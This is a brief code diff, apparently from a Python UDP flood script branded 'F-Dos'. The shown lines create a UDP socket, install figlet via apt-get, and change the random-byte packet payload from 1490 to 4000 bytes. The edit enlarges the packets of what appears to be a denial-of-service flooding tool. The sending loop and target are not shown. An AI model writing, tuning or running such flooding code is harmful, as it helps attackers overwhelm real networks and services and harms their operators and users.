@@ -14,7 +14,7 @@ year = now.year
 os.system("apt-get install figlet -y ")
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+bytes = random._urandom(4000)
 
 os.system("figlet F-Dos")
 
